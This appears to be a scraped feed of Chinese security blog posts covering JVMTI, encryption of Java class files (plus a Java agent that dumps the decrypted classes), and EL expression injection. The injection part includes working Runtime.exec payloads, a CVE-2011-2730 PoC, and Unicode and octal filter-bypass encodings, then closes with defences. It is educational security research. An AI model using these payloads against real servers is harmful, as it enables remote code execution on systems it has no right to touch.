知道这些信息，事实上我们也可以设计自己的算法来判断是否死锁。更重要的是，JVMTI 提供了一系列的监视器（Monitor）操作，来帮助我们在 native 环境中实现同步。主要的操作是构建监视器（CreateRawMonitor），获取监视器（RawMonitorEnter），释放监视器（RawMonitorExit），等待和唤醒监视器 (RawMonitorWait,RawMonitorNotify) 等操作，通过这些简单锁，程序的同步操作可以得到保证。 0x05 JVMTI数据结构JVMTI 中使用的数据结构，首先也是一些标准的 JNI 数据结构，比如 jint，jlong ；其次，JVMTI 也定义了一些基本类型，比如 jthread，表示一个 thread，jvmtiEvent，表示 jvmti 所定义的事件；更复杂的有 JVMTI 的一些需要用结构体表示的数据结构，比如堆的信息（jvmtiStackInfo）。这些数据结构在文档中都有清楚的定义，本文就不再详细解释。 0x06 JVMTI应用场景对class文件加密有时一些涉及到关键技术的class文件或者jar包我们不希望对外暴露，因而需要进行加密。使用一些常规的手段（例如使用混淆器或者自定义类加载器）来对class文件进行加密很容易被反编译。反编译后的代码虽然增加了阅读的难度，但花费一些功夫也是可以读懂的。 JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。 具体的实例可参考：《Java代码反反编译对抗思路》 实现应用性能监控(APM)在微服务大行其道的环境下，分布式系统的逻辑结构变得越来越复杂。这给系统性能分析和问题定位带来了非常大的挑战。基于JVMTI的APM能够解决分布式架构和微服务带来的监控和运维上的挑战。APM通过汇聚业务系统各处理环节的实时数据，分析业务系统各事务处理的交易路径和处理时间，实现对应用的全链路性能监测。开源的Pinpoint, ZipKin, Hawkular,商业的AppDynamics，OneAPM，Google Dapper等都是个中好手。 产品运行时错误监测及调试想要看生产环境的异常，最原始的方式是登录到生产环境的机器查看日志。稍微高级一点的方式是通过日志监控或者APM等工具将异常采集上来。但是这些手段都有许多明显的缺点。首先，不是所有的异常都会被打印到日志中，有些异常可能被代码吃掉了；其次，打印异常的时候通常只有异常堆栈信息，异常发生时上下文的变量值很难获取到（除非有经验的程序员将其打印出来了），而这些信息对定位异常的原因至关重要。基于JVMTI可以开发出一款工具来时事监控生产环境的异常。这方面有一款成熟的商业软件OverOps，其有三个主要的功能：1. 采集到所有的异常，包括try catch之后没有打印出来的异常；2. 可以采集到异常发生时上下文所有变量的值；3. 可以将异常发生的堆栈对应的源代码采集展示出来，从而在一个系统上就可以看代码定位问题，不需要打开ide调试源代码。 Java程序的调试（debug）一般JAVA的IDE都自带了调试工具。例如Eclipse的调试器相信大部分人都使用过。它的调试器org.eclipse.jdt.debug插件底层就是调用的JVMTI来实现的。不仅如此，随着服务云化的发展，google甚至推出了云端调试工具cloud debugger。它时一个web应用，可以直接对生产环境进行远程调试，不需要重启或者中断服务。阿里也有类似的工具Zdebugger。 Java程序的诊断（profile）当出现cpu使用率过高、线程死锁等问题时，需要使用一些JAVA性能剖析或者诊断工具来分析具体的原因。例如Alibaba开源的Java诊断工具Arthas，深受开发者喜爱。Arthas的功能十分强大，它可以查看或者动态修改某个变量的值、统计某个方法调用链上的耗时、拦截方法前后，打印参数值和返回值，以及异常信息等。 热加载热加载指的是在不重启虚拟机的情况下重新加载一些class。热加载可以使本地调试代码非常节省时间，不用每次更新代码都重启一边程序。同时，在一线不方便重启的线上环境也能派上用场。这方面的代表产品有商业产品JRebel等。JRebel能够对应用中的任何class起作用。 0x07 参考JVMTI 和 Agent 实现 Java黑科技之源：JVMTI完全解读","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Java代码反反编译对抗思路","date":"2020-05-01T04:04:30.000Z","path":"2020/05/01/Java代码反反编译思路/","text":"0x01 几种反反编译的方法Java代码是可以反编译的，但是很多时候一些Java开发者并不想让其他人知道自己的代码是怎么写的，就会对Java代码进行加密或混淆等操作，一般来说有三个思路： 将class文件加密，这个是最安全的，但也费事儿，因为要重写classloader来解密class文件； 使用花指令，使得class文件不能反编译（利用反编译工具漏洞)；安全性一般，还是有花指令破解器； 代码混淆，提高代码阅读成本；简单易操作，一般采用这种或者与其它方式结合； 当然，这几种方法都是可以被破解的，只是不同方法的破解成本不一样而已。 0x02 准备jar包新建一个ClassEncode项目，再新建两个类如下： 12345678910111213141516171819package com.mi1k7ea;public class Test &#123; public static final String a = \"This is Test Class ..\"; public static void main(String[] args) &#123; System.out.println(a); new Test2(); &#125;&#125;package com.mi1k7ea;public class Test2 &#123; public Test2() &#123; System.out.println(\"This is Test2 Class ..\"); &#125;&#125; 接着将该项目打包成jar包。 IDEA打包jar在项目上鼠标右键 –&gt; Open Module Settings： Artifacts –&gt; + –&gt; JAR –&gt; From modules with dependencies： 接着是设置Create JAR from Modules： Main Class是这个项目(脚本)的主方法，就是要运行的类，选Test类。 关于JAR files from libraries的两个选项: 选中第一个的话，打完包后是一个Jar包； 选中第二个的话，打完包后是一个Jar包，外带你项目所用的Jar包； 接下来是MF文件的存放目录。注意，不能使用默认目录，必须自定义目录，不然会运行错误，也不能使用src/main/resources这个目录。这里设置的是项目根目录下的src目录下来新建resource目录。 设置完之后，此时应该也必须有META-INF此文件，不然会运行错误。若JAR files from libraries选择src/main/resources目录，是没有META-INF文件的。Output directory是jar包的保存目录： 点击Build： 然后在out目录中看到生成了Jar包： 这时的运行jar包就能执行了： ok，我们就拿这个包作为Demo进行反编译操作。 手动打包jar当然，也可以手动打包jar文件。 目录结构如下： com mi1k7ea ​ Test.class ​ Test2.class META-INF ​ MANIFEST.MF 其中MANIFEST.MF中的Main-Class要指定主要的执行类： 12Manifest-Version: 1.0Main-Class: com.mi1k7ea.Test 注意：最后必须要回车空行出来。 最后在当前目录运行一下命令打包成jar并执行即可： 12jar cvfm test.jar META-INF\\MANIFEST.MF .java -jar test.jar 0x03 加密Jar包和class文件利用JVMTI实现反反编译JVMTI（JVM Tool Interface）是Java虚拟机所提供的native编程接口，可以探查JVM内部状态，并控制JVM应用程序的执行。可实现的功能包括但不限于：调试、监控、线程分析、覆盖率分析工具等。 JVMTI能够监听class加载事件，因此我们可以使用一套加密算法，对即将发布的Jar包进行字节码加密，然后在JVM加载这些类之前再解密。由于这部分代码最终会以动态库（.dll、.so文件）的形式发布出去，不容易被破解，因此对源代码可以达到较好的保护效果。 这里用到一个工具：https://github.com/AloneMonkey/JarEncrypt 解压之后得到如下的目录结构及文件： JarEncrypt/encrypt：加密库 encrypt.cpp Makefile Encrypt.java（Java加密执行文件） JarEncrypt/decrypt：解密库 decrypt.cpp Makefile 打开Encrypt.java文件，修改需要进行加密的类为以”com.mi1k7ea”开头的包下的所有类： 然后打开decrypt子目录下的decrypt.cpp文件，修改需要进行解密的类为以”com.mi1k7ea”开头的包下的所有类： 接着，进入encrypt目录，执行make，编译生成libencrypt.so： 注意，在Linux可能会报找不到jni.h和jni_md.h文件的错误，这里需要通过locate jni.h和locate jni_md.h命令来找到这两个文件所在的路径，然后在Makefile中第一个INCLUDEDIR项中添加进去即可： libdecrypt.so的编译同上： 接着，通过javac Encrypt.java命令将该java文件转换为class文件： 通过如下命令加密jar包： 1java -Djava.library.path=. -cp . Encrypt -src ClassEncode.jar 此时用反编译工具是没办法成功反编译的： 此时运行肯定是会失败的： 使用刚刚的编译生成的解密库来执行就ok了： 12export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/root/jvmti/decryptjava -agentlib:decrypt -jar ClassEncode_encrypt.jar 至此，已经通过加密Jar包和class文件实现了反反编译。在发布时候，需要把ClassEncode_encrypt.jar和libdecrypt.so发布出去，执行时候引入libdecrypt即可。 通过Java-Agent绕过反反编译这部分在JavaAgent中会具体说明。 MainAgent.java： 12345678910111213package com.dumpclass;import java.lang.instrument.Instrumentation;public class MainAgent &#123; public static void main(String[] args) &#123; &#125; public static void premain(String args, Instrumentation instrumentation) &#123; instrumentation.addTransformer(new DumpClassTransformer()); &#125;&#125; DumpClassTransformer.java： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package com.dumpclass;import java.io.File;import java.io.FileOutputStream;import java.lang.instrument.ClassFileTransformer;import java.lang.instrument.IllegalClassFormatException;import java.security.ProtectionDomain;public class DumpClassTransformer implements ClassFileTransformer &#123; private static final String DUMP_PACKAGE = System.getProperty(\"dump_package\"); private static final String OUT_FOLDER = System.getProperty(\"dump_out_folder\"); @Override public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException &#123; if (className == null || className.isEmpty()) &#123; return classfileBuffer; &#125; if (classfileBuffer == null) &#123; return classfileBuffer; &#125; String tmpClassName = className.replace(\"/\", \".\"); if (tmpClassName.startsWith(DUMP_PACKAGE)) &#123; try &#123; writeClass(className, classfileBuffer); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return classfileBuffer; &#125; private boolean writeClass(String className, byte[] classfileBuffer) &#123; File file = null; FileOutputStream fileOutputStream = null; try &#123; String folder = OUT_FOLDER; if (!folder.endsWith(File.separator)) &#123; folder = folder + File.separator; &#125; String classPath = className.substring(0, className.lastIndexOf(\"/\")); className = className.substring(className.lastIndexOf(\"/\") + 1, className.length()); String path = OUT_FOLDER + File.separator + classPath; file = new File(path); if (!file.exists()) &#123; file.mkdirs(); &#125; file = new File(path + File.separator + className + \".class\"); fileOutputStream = new FileOutputStream(file); fileOutputStream.write(classfileBuffer); fileOutputStream.flush(); &#125; catch (Exception e) &#123; e.printStackTrace(); return false; &#125; finally &#123; try &#123; if (fileOutputStream != null) &#123; fileOutputStream.close(); fileOutputStream = null; &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; return true; &#125;&#125; MANIFEST.MF： 1234Manifest-Version: 1.0Can-Redefine-Classes: trueCan-Retransform-Classes: truePremain-Class: com.dumpclass.MainAgent 打包成ClassEncode_encrypt.jar。 通过以下命令，指定JavaAgent的jar包，然后在目标jar包主执行类方法执行之前先执行DumpClass.jar中的premain()方法，从而从内存将加密的目标jar类的字节码Dump下来： 1java -Ddump_package=com.mi1k7ea -Ddump_out_folder=/tmp -agentlib:decrypt -javaagent:DumpClass.jar -jar ClassEncode_encrypt.jar 下载下来，此时就能从成功反编译 获取到加密class文件的内容了： 0x04 Java代码混淆参考：https://www.cnblogs.com/nevermorewang/p/8041548.html 这种反反编译方法的没啥破解方法，就是代码比较难读而已，花点时间精力就可以搞定。 0x05 使用花指令这部分还未研究，有待补充。。。 0x06 参考jar包加密保护解决方案","tags":[{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"（先知首发）浅析EL表达式注入漏洞","date":"2020-04-25T16:05:47.000Z","path":"2020/04/26/浅析EL表达式注入漏洞/","text":"先知：https://xz.aliyun.com/t/7692 0x01 EL简介EL（Expression Language） 是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL表达式主要功能如下： 获取数据：EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）； 执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如${user==null}； 获取Web开发常用对象：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据； 调用Java方法：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法； 0x02 基本语法EL语法在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。例如，${ userinfo}代表获取变量userinfo的值。当EL表达式中的变量不给定范围时，则默认在page范围查找，然后依次在request、session、application范围查找。也可以用范围作为前缀表示属于哪个范围的变量，例如：${ pageScope. userinfo}表示访问page范围中的userinfo变量。 简单地说，使用EL表达式语法：${EL表达式} 其中，EL表达式和JSP代码等价转换。事实上，可以将EL表达式理解为一种简化的JSP代码。 扩展JSP代码的写法总结： JSP表达式：&lt;%=变量或表达式&gt; 向浏览器输出变量或表达式的计算结果。 JSP脚本：&lt;%Java代码%&gt; 执行java代码的原理：翻译到_jspService()方法中。 JSP声明：&lt;%!变量或方法%&gt; 声明jsp的成员变量或成员方法。 JSP注释：&lt;%!--JSP注释--%&gt; 用于注释JSP代码，不会翻译到Java文件中，也不会执行。 [ ]与.运算符EL表达式提供.和[]两种运算符来存取数据。 当要存取的属性名称中包含一些特殊字符，如.或-等并非字母或数字的符号，就一定要使用[]。例如：${user.My-Name}应当改为${user[&quot;My-Name&quot;]}。 如果要动态取值时，就可以用[]来做，而.无法做到动态取值。例如：${sessionScope.user[data]}中data 是一个变量。 变量EL表达式存取变量数据的方法很简单，例如：${username}。它的意思是取出某一范围中名称为username的变量。因为我们并没有指定哪一个范围的username，所以它会依序从Page、Request、Session、Application范围查找。假如途中找到username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传””。EL表达式的属性如下： 属性范围在EL中的名称 Page PageScope Request RequestScope Session SessionScope Application ApplicationScope JSP表达式语言定义可在表达式中使用的以下文字： 文字 文字的值 Boolean true 和 false Integer 与 Java 类似。可以包含任何整数，例如 24、-45、567 Floating Point 与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567 String 任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。 Null null 操作符JSP表达式语言提供以下操作符，其中大部分是Java中常用的操作符： 术语 定义 算术型 +、-（二元）、*、/、div、%、mod、-（一元） 逻辑型 and、&amp;&amp;、or、双管道符、!、not 关系型 ==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。 空 empty 空操作符是前缀操作，可用于确定值是否为空。 条件型 A ?B :C。根据 A 赋值的结果来赋值 B 或 C。 隐式对象JSP表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用： 术语 定义 pageContext JSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，${pageContext.response}为页面的响应对象赋值。 此外，还提供几个隐式对象，允许对以下对象进行简易访问： 术语 定义 param 将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param . name}相当于 request.getParameter (name)。 paramValues 将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。 header 将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。 headerValues 将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式${headerValues. name}相当于 request.getHeaderValues(name)。 cookie 将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式${cookie. name .value}返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用${headerValues. name}表达式。 initParam 将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。 除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面： 术语 定义 pageScope 将页面范围的变量名称映射到其值。例如，EL 表达式可以使用${pageScope.objectName}访问一个 JSP 中页面范围的对象，还可以使用${pageScope .objectName. attributeName}访问对象的属性。 requestScope 将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用${requestScope. objectName}访问一个 JSP 请求范围的对象，还可以使用${requestScope. objectName. attributeName}访问对象的属性。 sessionScope 将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：${sessionScope. name} applicationScope 将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。 pageContext对象pageContext对象是JSP中pageContext对象的引用。通过pageContext对象，您可以访问request对象。比如，访问request对象传入的查询字符串，就像这样： 1$&#123;pageContext.request.queryString&#125; Scope对象pageScope，requestScope，sessionScope，applicationScope变量用来访问存储在各个作用域层次的变量。 举例来说，如果您需要显式访问在applicationScope层的box变量，可以这样来访问：applicationScope.box。 1234567891011121314&lt;% pageContext.setAttribute(\"name\",\"mi1k7ea_page\"); request.setAttribute(\"name\",\"mi1k7ea_request\"); session.setAttribute(\"user\",\"mi1k7ea_session\"); application.setAttribute(\"user\",\"mi1k7ea_application\");%&gt;pageScope.name:$&#123;pageScope.name&#125;&lt;/br&gt;requestScope.name : $&#123;requestScope.name&#125;&lt;/br&gt;sessionScope.user : $&#123;sessionScope.user&#125;&lt;/br&gt;applicationScope.user : $&#123;applicationScope.user&#125; param和paramValues对象param和paramValues对象用来访问参数值，通过使用request.getParameter方法和request.getParameterValues方法。 举例来说，访问一个名为order的参数，可以这样使用表达式：${param.order}，或者${param[“order”]}。 接下来的例子表明了如何访问request中的username参数： 1234567891011121314151617&lt;%@ page import=\"java.io.*,java.util.*\" %&gt;&lt;% String title = \"Accessing Request Param\";%&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;&lt;/center&gt;&lt;div align=\"center\"&gt;&lt;p&gt;$&#123;param[\"username\"]&#125;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; param对象返回单一的字符串，而paramValues对象则返回一个字符串数组。 header和headerValues对象header和headerValues对象用来访问信息头，通过使用request.getHeader()方法和request.getHeaders()方法。 举例来说，要访问一个名为user-agent的信息头，可以这样使用表达式：${header.user-agent}，或者${header[&quot;user-agent&quot;]}。 接下来的例子表明了如何访问user-agent信息头： 1234567891011121314151617&lt;%@ page import=\"java.io.*,java.util.*\" %&gt;&lt;% String title = \"User Agent Example\";%&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;&lt;% out.print(title); %&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;&lt;% out.print(title); %&gt;&lt;/h1&gt;&lt;/center&gt;&lt;div align=\"center\"&gt;&lt;p&gt;$&#123;header[\"user-agent\"]&#125;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 运行结果如下： header对象返回单一值，而headerValues则返回一个字符串数组。 EL中的函数EL允许您在表达式中使用函数。这些函数必须被定义在自定义标签库中。函数的使用语法如下： 1$&#123;ns:func(param1, param2, ...)&#125; ns指的是命名空间（namespace），func指的是函数的名称，param1指的是第一个参数，param2指的是第二个参数，以此类推。比如，有函数fn:length，在JSTL库中定义，可以像下面这样来获取一个字符串的长度： 1$&#123;fn:length(&quot;Get my length&quot;)&#125; 要使用任何标签库中的函数，您需要将这些库安装在服务器中，然后使用&lt;taglib&gt;标签在JSP文件中包含这些库。 EL表达式调用Java方法看个例子即可。 先新建一个ELFunc类，其中定义的doSomething()函数用于给输入的参数字符拼接”.com”形成域名返回： 1234567package eltest;public class ELFunc &#123; public static String doSomething(String str)&#123; return str + \".com\"; &#125;&#125; 接着在WEB-INF文件夹下（除lib和classess目录外）新建test.tld文件，其中指定执行的Java方法及其URI地址： 12345678910111213&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;taglib version=\"2.0\" xmlns=\"http://java.sun.com/xml/ns/j2ee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"&gt; &lt;tlib-version&gt;1.0&lt;/tlib-version&gt; &lt;short-name&gt;ELFunc&lt;/short-name&gt; &lt;uri&gt;http://www.mi1k7ea.com/ELFunc&lt;/uri&gt; &lt;function&gt; &lt;name&gt;doSomething&lt;/name&gt; &lt;function-class&gt;eltest.ELFunc&lt;/function-class&gt; &lt;function-signature&gt; java.lang.String doSomething(java.lang.String)&lt;/function-signature&gt; &lt;/function&gt;&lt;/taglib&gt; JSP文件中，先头部导入taglib标签库，URI为test.tld中设置的URI地址，prefix为test.tld中设置的short-name，然后直接在EL表达式中使用类名:方法名()的形式来调用该类方法即可： 12&lt;%@taglib uri=\"http://www.mi1k7ea.com/ELFunc\" prefix=\"ELFunc\"%&gt;$&#123;ELFunc:doSomething(\"mi1k7ea\")&#125; 0x03 JSP中启动/禁用EL表达式全局禁用EL表达式web.xml中进入如下配置： 123456&lt;jsp-config&gt; &lt;jsp-property-group&gt; &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt; &lt;el-ignored&gt;true&lt;/el-ignored&gt; &lt;/jsp-property-group&gt;&lt;/jsp-config&gt; 单个文件禁用EL表达式在JSP文件中可以有如下定义： 1&lt;%@ page isELIgnored=\"true\" %&gt; 该语句表示是否禁用EL表达式，TRUE表示禁止，FALSE表示不禁止。 JSP2.0中默认的启用EL表达式。 例如如下的JSP代码禁用EL表达式： 12&lt;%@ page isELIgnored=\"true\" %&gt;$&#123;pageContext.request.queryString&#125; 0x04 EL表达式注入漏洞EL表达式注入漏洞和SpEL、OGNL等表达式注入漏洞是一样的漏洞原理的，即表达式外部可控导致攻击者注入恶意表达式实现任意代码执行。 一般的，EL表达式注入漏洞的外部可控点入口都是在Java程序代码中，即Java程序中的EL表达式内容全部或部分是从外部获取的。 通用PoC1234567891011121314//对应于JSP页面中的pageContext对象（注意：取的是pageContext对象）$&#123;pageContext&#125;//获取Web路径$&#123;pageContext.getSession().getServletContext().getClassLoader().getResource(&quot;&quot;)&#125;//文件头参数$&#123;header&#125;//获取webRoot$&#123;applicationScope&#125;//执行命令$&#123;pageContext.request.getSession().setAttribute(&quot;a&quot;,pageContext.request.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;).getInputStream())&#125; 比如我们在Java程序中可以控制输入EL表达式如下： 1$&#123;pageContext.setAttribute(&quot;a&quot;,&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,&quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(null),&quot;calc.exe&quot;))&#125; 如果该EL表达式直接在JSP页面中执行，则触发任意代码执行漏洞： 但是在实际场景中，是几乎没有也无法直接从外部控制JSP页面中的EL表达式的。而目前已知的EL表达式注入漏洞都是框架层面服务端执行的EL表达式外部可控导致的。 CVE-2011-2730命令执行PoC如下： 123&lt;spring:message text=\"$&#123;/\"/\".getClass().forName(/\"java.lang.Runtime/\").getMethod(/\"getRuntime/\",null).invoke(null,null).exec(/\"calc/\",null).toString()&#125;\"&gt;&lt;/spring:message&gt; 再比如： 12&lt;%@ taglib uri=\"http://www.springframework.org/tags\" prefix=\"spring\"%&gt;&lt;spring:message text=\"$&#123;param.a&#125;\"&gt;&lt;/spring:message&gt; 访问http://localhost/XXX.jsp?a=$](https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%2FXXX.jsp%3Fa%3D%24){applicationScope}。 容器第一次执行EL表达式${param.a}获得了我们输入的${applicationScope}，然后Spring标签获取容器的EL表达式求值对象，把${applicationScope}再次执行掉，形成了漏洞。 Wooyun案例参考Wooyun镜像上的案例： 搜狗某系统存在远程EL表达式注入漏洞(命令执行) 工商银行某系统存在远程EL表达式注入漏洞(命令执行) JUEL示例下面我们直接看下在Java代码中EL表达式注入的场景是怎么样的。 EL曾经是JSTL的一部分。然后，EL进入了JSP 2.0标准。现在，尽管是JSP 2.1的一部分，但EL API已被分离到包javax.el中， 并且已删除了对核心JSP类的所有依赖关系。换句话说：EL已准备好在非JSP应用程序中使用！ 也就是说，现在EL表达式所依赖的包javax.el等都在JUEL相关的jar包中。 JUEL（Java Unified Expression Language）是统一表达语言轻量而高效级的实现，具有高性能，插件式缓存，小体积，支持方法调用和多参数调用，可插拔多种特性。 更多参考官网：http://juel.sourceforge.net/ 需要的jar包：juel-api-2.2.7、juel-spi-2.2.7、juel-impl-2.2.7。 Test.java，利用反射调用Runtime类方法实现命令执行： 123456789101112131415161718import de.odysseus.el.ExpressionFactoryImpl;import de.odysseus.el.util.SimpleContext;import javax.el.ExpressionFactory;import javax.el.ValueExpression;public class Test &#123; public static void main(String[] args) &#123; ExpressionFactory expressionFactory = new ExpressionFactoryImpl(); SimpleContext simpleContext = new SimpleContext(); // failed // String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('calc')&#125;\"; // ok String exp = \"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\"; ValueExpression valueExpression = expressionFactory.createValueExpression(simpleContext, exp, String.class); System.out.println(valueExpression.getValue(simpleContext)); &#125;&#125; 运行即触发： 0x05 绕过方法这里针对前面在Java代码中注入EL表达式的例子来演示。其实绕过方法和SpEL表达式注入是一样的。 利用反射机制绕过即前面Demo的PoC，注意一点的就是这里不支持用字符串拼接的方式绕过关键字过滤。 利用ScriptEngine调用JS引擎绕过同SpEL注入中讲到的： 1$&#123;&apos;&apos;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;java.lang.Runtime.getRuntime().exec(&apos;calc&apos;)&quot;)&#125; 利用Unicode编码绕过对可利用的PoC进行全部或部分的Unicode编码都是OK的： 12// Unicode编码内容为前面反射调用的PoC\\u0024\\u007b\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0065\\u0078\\u0065\\u0063\\u0027\\u002c\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u0027\\u0027\\u002e\\u0067\\u0065\\u0074\\u0043\\u006c\\u0061\\u0073\\u0073\\u0028\\u0029\\u002e\\u0066\\u006f\\u0072\\u004e\\u0061\\u006d\\u0065\\u0028\\u0027\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0067\\u0065\\u0074\\u004d\\u0065\\u0074\\u0068\\u006f\\u0064\\u0028\\u0027\\u0067\\u0065\\u0074\\u0052\\u0075\\u006e\\u0074\\u0069\\u006d\\u0065\\u0027\\u0029\\u002e\\u0069\\u006e\\u0076\\u006f\\u006b\\u0065\\u0028\\u006e\\u0075\\u006c\\u006c\\u0029\\u002c\\u0027\\u0063\\u0061\\u006c\\u0063\\u002e\\u0065\\u0078\\u0065\\u0027\\u0029\\u007d 利用八进制编码绕过同上，全部或部分进行八进制编码都是OK的： 12// 八进制编码内容为前面反射调用的PoC\\44\\173\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\145\\170\\145\\143\\47\\54\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\51\\56\\151\\156\\166\\157\\153\\145\\50\\47\\47\\56\\147\\145\\164\\103\\154\\141\\163\\163\\50\\51\\56\\146\\157\\162\\116\\141\\155\\145\\50\\47\\152\\141\\166\\141\\56\\154\\141\\156\\147\\56\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\147\\145\\164\\115\\145\\164\\150\\157\\144\\50\\47\\147\\145\\164\\122\\165\\156\\164\\151\\155\\145\\47\\51\\56\\151\\156\\166\\157\\153\\145\\50\\156\\165\\154\\154\\51\\54\\47\\143\\141\\154\\143\\56\\145\\170\\145\\47\\51\\175 这里我是通过写个小脚本来实现编码转换的： 123456str = \"$&#123;''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc.exe')&#125;\"result = \"\"for s in str: num = \"\\\\\" + oct(ord(s)) result += numprint(result.replace(\"\\\\0\", \"\\\\\")) 0x06 防御方法 尽量不使用外部输入的内容作为EL表达式内容； 若使用，则严格过滤EL表达式注入漏洞的payload关键字； 如果是排查Java程序中JUEL相关代码，则搜索如下关键类方法： 12javax.el.ExpressionFactory.createValueExpression()javax.el.ValueExpression.getValue() 0x07 参考JSP 表达式语言 EL表达式调用java方法 JAVA WEB 